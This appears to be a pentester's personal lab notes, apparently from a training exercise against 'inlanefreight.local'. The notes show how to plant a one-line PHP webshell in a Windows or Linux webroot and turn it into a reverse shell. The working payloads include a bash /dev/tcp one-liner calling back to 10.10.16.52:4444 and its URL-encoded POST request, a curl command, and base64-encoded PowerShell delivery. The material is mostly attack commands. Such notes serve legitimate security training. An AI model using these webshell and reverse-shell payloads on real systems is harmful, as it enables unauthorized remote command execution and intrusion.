write webshell files to webroot.
#### WIndows
inet/pub/www or smth
```
echo '<?php system($_REQUEST["cmd"]); ?>' | OutFile -Encoding UTF8 shell.php
```
in windows, convert the php file to UTF8 First
![[Pasted image 20251004153427.png]]
now you can browse to that webshell and intercept in burp,

#### creating webshell on linux
```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
### converting webshell to reverse shell 
use POST method + url encode the payload always
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
<ENTER>
<ENTER>
bash<url encode: -c 'bash -i >& /dev/tcp/10.10.16.52/4444 0>&1'>
```
now URL ENCODE : 
```
cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<YOURIP>%2F<PORT>%200%3E%261'
```
### URL ENCODE
![[Pasted image 20251005213504.png]]
![[Pasted image 20251005213933.png]]
## example request
```
POST /srtsr5hysr5y4ras4yhg3Q.php HTTP/1.1
Host: inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.52%2F4444%200%3E%261'
```

```
curl -v -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'cmd=whoami' \
  'http://inlanefreight.local/srtsr5hysr5y4ras4yhg3Q.php'
```
---
### Get a reverse shell


---
### FOR WINDOWS
to get a reverse shell,  copy either rev.ps1 or conpty.ps1 and convert them to base64, convert to UTF16 le
```
nano /tools/rev.ps1
# EDIT IP PORT
cat /tools/rev.ps1 |iconv -t utf-16le | base64 -w 0
```

copy b64, go to burp
then change request to `POST` 
with the data field: DONT FORGET TO URL ENCODE the payload ctrl shift + u
`cmd=powershell -EncodedCommand <base64>`
![[Pasted image 20251004153924.png]]

